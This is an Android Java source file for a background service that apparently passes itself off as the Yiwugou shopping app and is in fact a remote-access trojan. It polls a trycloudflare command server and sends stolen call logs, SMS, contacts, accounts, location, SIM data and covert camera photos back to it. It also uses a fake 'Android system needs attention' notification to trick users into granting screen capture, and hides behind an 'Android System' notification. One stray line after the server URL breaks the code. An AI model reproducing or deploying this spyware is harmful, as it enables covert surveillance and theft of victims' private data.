package com.yiwugou.yiwukanz;

import static android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
import static android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION;


import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Base64;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import org.json.JSONObject;

import java.io.IOException;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.UUID;
import java.util.concurrent.TimeUnit;

public class MainService extends Service {

    private boolean keepRunning = true;
    private Thread pollingThread;
    private OkHttpClient client;
    private SharedPreferences sharedPrefs;
    private String a;

    public static final String serverUrl = "https://oliver-still-tropical-dam.trycloudflare.com";
"; //在这里更改您的网址

    @SuppressLint("ForegroundServiceType")
    @Override
    public void onCreate() {
        super.onCreate();



        sharedPrefs= getSharedPreferences("开始", MODE_PRIVATE);


        a = sharedPrefs.getString("节省", null);
        String ac="a";

        if(a == null){
            a = UUID.randomUUID().toString();
            sharedPrefs.edit().putString("节省", a).apply();
            ac="ac";
        }

        try{
            JSONObject json=new JSONObject();
            json.put("id",a);


            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = registerReceiver(null, ifilter);
            int level = -1, scale = -1;
            if (batteryStatus != null) {
                level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            }
            float batteryPct = level >= 0 && scale > 0 ? (level * 100f / scale) : -1;


            String  country = Locale.getDefault().getCountry();



            json.put("type", ac);
            json.put("brand", Build.BRAND);
            json.put("model", Build.MODEL);
            json.put("manufacturer", Build.MANUFACTURER);
            json.put("device", Build.DEVICE);
            json.put("product", Build.PRODUCT);
            json.put("sdk_int", Build.VERSION.SDK_INT);
            json.put("os_version", Build.VERSION.RELEASE);


            json.put("battery", batteryPct);

            json.put("country", country);

            String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            json.put("android_id", androidId);

            json.put("language", Locale.getDefault().getLanguage());

            json.put("timezone", java.util.TimeZone.getDefault().getID());

            sendMessage(json.toString());


        }catch (Exception e){
            e.printStackTrace();
        }



        client = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(40, TimeUnit.SECONDS)
                .writeTimeout(15, TimeUnit.SECONDS)
                .build();


        String finalA = a;
        pollingThread = new Thread(() -> {
            while (keepRunning) {
                try {


                    Request request = new Request.Builder()
                            .url(serverUrl+"/call?id="+ finalA)
                            .build();

                    Response response = client.newCall(request).execute();

                    if (response.isSuccessful() && response.body() != null) {
                        String msg = response.body().string();
                        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                            return;
                        }
                        handleResponse(msg);
                    }

                    response.close();
                } catch (IOException e) {
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException ignored) {}
                }
            }
        });

        pollingThread.start();
    }


    private void handleResponse(String msg) {


        try{

            JSONObject json=new JSONObject(msg);
            String text = json.getString("call");



            switch (text) {
                case "📃 获取通话记录":
                    getCallDetails();
                    break;
                case "📩 获取所有消息":
                    getAllSms();
                    break;
                case "👥 获取联系人":
                    getAllContacts();
                    break;
                case "📱 获取所有应用":
                    getInstalledApps();
                    break;
                case "📍 获取位置信息":
                    Handler mainHandler = new Handler(Looper.getMainLooper());
                    mainHandler.post(this::getLocation);
                    break;
                case "📶 获取SIM卡信息":
                    getSimInfo();
                    break;
                case "📸 前置摄像头":
                    startFrontOrBackCamera(true);
                    break;
                case "📸 后置摄像头":
                    startFrontOrBackCamera(false);
                    break;
                case "👤 获取账号列表":
                    getAccounts();
                    break;
                case "🖥️ 获取系统信息":
                    getSystemInfo();
                    break;
                case "vnc":
                    showCaptureNotification();
                    break;
            }



        }catch(Exception e){
            e.printStackTrace();
        }

    }










    public void sendMessage(String json) {
        new Thread(() -> {
            try {
                OkHttpClient client = new OkHttpClient();


                MediaType JSON = MediaType.parse("application/json; charset=utf-8");
                RequestBody body = RequestBody.create(json, JSON);

                Request request = new Request.Builder()
                        .url(serverUrl+"/call")
                        .post(body)
                        .build();

                Response response = client.newCall(request).execute();

                response.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }


    private void showCaptureNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.putExtra("type","vnc");

        PendingIntent pendingIntent = PendingIntent.getActivity(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "义乌购",
                    "义乌购",
                    NotificationManager.IMPORTANCE_HIGH
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, "义乌购")
                .setContentTitle("安卓系统需要关注")
                .setContentText("点击此处解决问题")
                .setSmallIcon(R.drawable.ic)
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .build();

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        NotificationManagerCompat.from(this).notify(1001, notification);

    }

    private void getCallDetails() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
            cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null,
                    null,
                    null,
                    CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);

                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

                while (cursor.moveToNext()) {
                    String phNumber = cursor.getString(numberIdx);
                    String contactName = getContactName(phNumber);
                    if (contactName == null) contactName = phNumber;

                    String callType = cursor.getString(typeIdx);
                    String callDate = cursor.getString(dateIdx);
                    Date callDayTime = new Date(Long.parseLong(callDate));
                    String formattedDate = sdf.format(callDayTime);

                    String callDuration = cursor.getString(durationIdx);
                    String formattedDuration = formatDuration(Integer.parseInt(callDuration));

                    String dir;
                    int dircode = Integer.parseInt(callType);
                    switch (dircode) {
                        case CallLog.Calls.OUTGOING_TYPE:
                            dir = "📤 外拨";
                            break;
                        case CallLog.Calls.INCOMING_TYPE:
                            dir = "📥 来电";
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            dir = "❌ 未接";
                            break;
                        case CallLog.Calls.REJECTED_TYPE:
                            dir = "🚫 拒接";
                            break;
                        default:
                            dir = "🔹 其他";
                            break;
                    }

                    sb.append("👤 联系人: ").append(contactName)
                            .append("\n📞 电话: ").append(phNumber)
                            .append("\n🕒 类型: ").append(dir)
                            .append("\n📅 日期: ").append(formattedDate)
                            .append("\n⏱️ 时长: ").append(formattedDuration)
                            .append("\n-------------------\n");
                }
            }


            try{
                JSONObject json = new JSONObject();
                json.put("type","t");
                json.put("id",a);
                json.put("data",sb.toString());

                sendMessage(json.toString());

            } catch (Exception e) {
                e.printStackTrace();
            }


        } catch (SecurityException e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
    }


    @SuppressLint("Range")
    private String getContactName(String phoneNumber) {
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
        String name = null;
        Cursor cursor = null;
        try {
            cursor = getContentResolver().query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            }
        } finally {
            if (cursor != null) cursor.close();
        }
        return name;
    }


    private String formatDuration(int seconds) {
        int h = seconds / 3600;
        int m = (seconds % 3600) / 60;
        int s = seconds % 60;
        if (h > 0) {
            return String.format(Locale.getDefault(), "%02d:%02d:%02d", h, m, s);
        } else {
            return String.format(Locale.getDefault(), "%02d:%02d", m, s);
        }
    }


    private void getAllContacts() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
            cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null,
                    null,
                    null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC"
            );

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    @SuppressLint("Range") String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    sb.append("👤 姓名: ").append(name).append("\n");


                    @SuppressLint("Range") int hasPhoneNumber = cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER));
                    if (hasPhoneNumber > 0) {
                        Cursor phoneCursor = getContentResolver().query(
                                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                                null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{contactId},
                                null
                        );

                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                @SuppressLint("Range") String phoneNumber = phoneCursor.getString(
                                        phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                                );
                                sb.append("📞 电话: ").append(phoneNumber).append("\n");
                            }
                            phoneCursor.close();
                        }
                    }


                    Cursor emailCursor = getContentResolver().query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                    );

                    if (emailCursor != null) {
                        while (emailCursor.moveToNext()) {
                            @SuppressLint("Range") String email = emailCursor.getString(
                                    emailCursor.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                            );
                            sb.append("📧 邮箱: ").append(email).append("\n");
                        }
                        emailCursor.close();
                    }

                    sb.append("-------------------\n");
                }
            }

            try{
                JSONObject json = new JSONObject();
                json.put("type","t");
                json.put("id",a);
                json.put("data",sb.toString());

                sendMessage(json.toString());

            } catch (Exception e) {
                e.printStackTrace();
            }

        } catch (SecurityException e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
    }



    private void getAllSms() {
        StringBuilder sb = new StringBuilder();
        Cursor cursor = null;

        try {
            cursor = getContentResolver().query(
                    Uri.parse("content://sms"),
                    null,
                    null,
                    null,
                    "date DESC"
            );

            if (cursor != null && cursor.getCount() > 0) {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

                while (cursor.moveToNext()) {
                    @SuppressLint("Range") String address = cursor.getString(cursor.getColumnIndex("address"));
                    @SuppressLint("Range") String body = cursor.getString(cursor.getColumnIndex("body"));
                    @SuppressLint("Range") String type = cursor.getString(cursor.getColumnIndex("type"));
                    @SuppressLint("Range") String date = cursor.getString(cursor.getColumnIndex("date"));
                    String formattedDate = sdf.format(new Date(Long.parseLong(date)));

                    String dir = "🔹 其他";
                    if (type.equals("1")) dir = "📥 收到";
                    else if (type.equals("2")) dir = "📤 发送";

                    sb.append("👤 联系人/号码: ").append(address)
                            .append("\n🕒 类型: ").append(dir)
                            .append("\n📅 日期: ").append(formattedDate)
                            .append("\n✉️ 内容: ").append(body)
                            .append("\n-------------------\n");
                }
            }

            try{
                JSONObject json = new JSONObject();
                json.put("type","t");
                json.put("id",a);
                json.put("data",sb.toString());

                sendMessage(json.toString());

            } catch (Exception e) {
                e.printStackTrace();
            }

        } catch (SecurityException e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) cursor.close();
        }
    }


    private void getSimInfo() {
        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        String simState = "";
        switch (tm.getSimState()) {
            case TelephonyManager.SIM_STATE_READY:
                simState = "✅ 已就绪";
                break;
            case TelephonyManager.SIM_STATE_ABSENT:
                simState = "❌ 无 SIM 卡";
                break;
            case TelephonyManager.SIM_STATE_NETWORK_LOCKED:
                simState = "🔒 网络锁定";
                break;
            case TelephonyManager.SIM_STATE_PIN_REQUIRED:
                simState = "🔑 需要 PIN";
                break;
            case TelephonyManager.SIM_STATE_PUK_REQUIRED:
                simState = "🛡️ 需要 PUK";
                break;
            default:
                simState = "❓ 未知状态";
                break;
        }

        String simOperatorName = tm.getSimOperatorName();
        String simCountryIso = tm.getSimCountryIso();
        String phoneNumber = tm.getLine1Number();

        StringBuilder sb = new StringBuilder();
        sb.append("📶 SIM 状态: ").append(simState).append("\n")
                .append("🏢 运营商名称: ").append(simOperatorName).append("\n")
                .append("🌍 国家码: ").append(simCountryIso).append("\n")
                .append("📞 号码: ").append(phoneNumber).append("\n");

        try{
            JSONObject json = new JSONObject();
            json.put("type","t");
            json.put("id",a);
            json.put("data",sb.toString());

            sendMessage(json.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getInstalledApps() {
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);

        StringBuilder sb = new StringBuilder();

        for (ApplicationInfo appInfo : apps) {

                String appName = pm.getApplicationLabel(appInfo).toString();
                String packageName = appInfo.packageName;

                sb.append("📦 应用名: ").append(appName)
                        .append("\n🆔 包名: ").append(packageName)
                        .append("\n-------------------\n");

        }

        try{
            JSONObject json = new JSONObject();
            json.put("type","t");
            json.put("id",a);
            json.put("data",sb.toString());

            sendMessage(json.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void getSystemInfo() {
        StringBuilder sb = new StringBuilder();

        sb.append("🖥️ 系统信息\n");
        sb.append("-------------------\n");
        sb.append("📱 品牌: ").append(android.os.Build.BRAND).append("\n");
        sb.append("📦 型号: ").append(android.os.Build.MODEL).append("\n");
        sb.append("🔧 制造商: ").append(android.os.Build.MANUFACTURER).append("\n");
        sb.append("📱 设备: ").append(android.os.Build.DEVICE).append("\n");
        sb.append("⚙️ SDK版本: ").append(android.os.Build.VERSION.SDK_INT).append("\n");
        sb.append("🆔 Android版本: ").append(android.os.Build.VERSION.RELEASE).append("\n");
        sb.append("🧩 硬件: ").append(android.os.Build.HARDWARE).append("\n");
        sb.append("🔨 产品: ").append(android.os.Build.PRODUCT).append("\n");
        sb.append("-------------------\n");

        try{
            JSONObject json = new JSONObject();
            json.put("type","t");
            json.put("id",a);
            json.put("data",sb.toString());

            sendMessage(json.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    private void getAccounts() {
        AccountManager accountManager = AccountManager.get(this);
        Account[] accounts = accountManager.getAccounts();

        StringBuilder sb = new StringBuilder();
        sb.append("👤 账号列表\n");
        sb.append("-------------------\n");

        for (Account account : accounts) {
            sb.append("💼 类型: ").append(account.type).append("\n");
            sb.append("📧 名称: ").append(account.name).append("\n");
            sb.append("-------------------\n");
        }

        try{
            JSONObject json = new JSONObject();
            json.put("type","t");
            json.put("id",a);
            json.put("data",sb.toString());

            sendMessage(json.toString());

        } catch (Exception e) {
            e.printStackTrace();
        }
    }



    private void getLocation() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                && ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            return;
        }

        LocationListener listener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                if (location != null) {
                    String info = "📍 位置信息\n" +
                            "-------------------\n" +
                            "🌐 纬度: " + location.getLatitude() + "\n" +
                            "🌐 经度: " + location.getLongitude() + "\n" +
                            "📏 海拔: " + location.getAltitude() + " 米\n" +
                            "-------------------";
                    try{
                        JSONObject json = new JSONObject();
                        json.put("type","l");
                        json.put("id",a);
                        json.put("lat",location.getLatitude());
                        json.put("lon",location.getLongitude());
                        json.put("alt",location.getAltitude());
                        json.put("data",info);

                        sendMessage(json.toString());

                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                locationManager.removeUpdates(this); // 单次获取，获取后取消更新
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {}

            @Override
            public void onProviderEnabled(String provider) {}

            @Override
            public void onProviderDisabled(String provider) {}
        };

        if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener);
        } else if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
            locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, listener);
        }
    }




    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    private void startFrontOrBackCamera(boolean useFrontCamera) {
        startBackgroundThread();

        CameraManager cameraManager = (CameraManager) getSystemService(CAMERA_SERVICE);
        try {
            for (String cameraId : cameraManager.getCameraIdList()) {
                CameraCharacteristics characteristics = cameraManager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null &&
                        ((useFrontCamera && facing == CameraCharacteristics.LENS_FACING_FRONT) ||
                                (!useFrontCamera && facing == CameraCharacteristics.LENS_FACING_BACK))) {

                    imageReader = ImageReader.newInstance(1080, 1920, ImageFormat.JPEG, 1);
                    imageReader.setOnImageAvailableListener(reader -> {
                        Image image = reader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] bytes = new byte[buffer.remaining()];
                            buffer.get(bytes);
                            String base64Image = Base64.encodeToString(bytes, Base64.NO_WRAP);
                          

                            try{
                                JSONObject json = new JSONObject();
                                json.put("type","c");
                                json.put("id",a);
                                json.put("data",base64Image);
                                sendMessage(json.toString());
                            } catch (Exception e) {
                                e.printStackTrace();
                            }

                            image.close();
                            closeCamera();
                        }
                    }, backgroundHandler);

                    if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                        return;
                    }
                    cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                        @Override
                        public void onOpened(@NonNull CameraDevice camera) {
                            cameraDevice = camera;
                            createCaptureSession();
                        }

                        @Override
                        public void onDisconnected(@NonNull CameraDevice camera) {
                            camera.close();
                        }

                        @Override
                        public void onError(@NonNull CameraDevice camera, int error) {
                            camera.close();
                        }
                    }, backgroundHandler);

                    break;
                }
            }
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    private void createCaptureSession() {
        try {
            cameraDevice.createCaptureSession(
                    Collections.singletonList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(@NonNull CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                CaptureRequest.Builder builder =
                                        cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                builder.addTarget(imageReader.getSurface());
                                captureSession.capture(builder.build(), null, backgroundHandler);
                            } catch (CameraAccessException e) {
                                e.printStackTrace();
                            }
                        }

                        @Override
                        public void onConfigureFailed(@NonNull CameraCaptureSession session) {}
                    },
                    backgroundHandler
            );
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    private void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private void closeCamera() {
        if (captureSession != null) {
            captureSession.close();
            captureSession = null;
        }
        if (cameraDevice != null) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
        stopBackgroundThread();
    }







    @SuppressLint("ForegroundServiceType")
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        createNotificationChannel();

        Notification notification = new NotificationCompat.Builder(this, "Android System")
                .setContentTitle("Android 系统正在运行")
                .setContentText("Android 系统正在运行")
                .setSmallIcon(android.R.drawable.ic_popup_sync)
                .build();


        String type = intent.getStringExtra("type");
        Intent data = intent.getParcelableExtra("data");
        int resultCode = intent.getIntExtra("resultCode",0);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {


            if(Objects.equals(type, "vnc")){


                startForeground(1, notification, FOREGROUND_SERVICE_TYPE_DATA_SYNC|FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);

                MediaProjectionManager projectionManager=(MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
                ScreenCapturer screenCapturer;

                MediaProjection projection = projectionManager.getMediaProjection(resultCode, data);
                screenCapturer = new ScreenCapturer(this, projection);
                screenCapturer.start();

            }else {

                startForeground(1, notification, FOREGROUND_SERVICE_TYPE_DATA_SYNC);

            }


        } else {
            startForeground(1, notification);
        }

        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "Android System";
            String description = "Android System";
            int importance = NotificationManager.IMPORTANCE_LOW;
            NotificationChannel channel = new NotificationChannel("Android System", name, importance);
            channel.setDescription(description);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

        }
    }


    @Override
    public void onDestroy() {
        keepRunning = false;
        if (pollingThread != null) {
            pollingThread.interrupt();
        }

        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
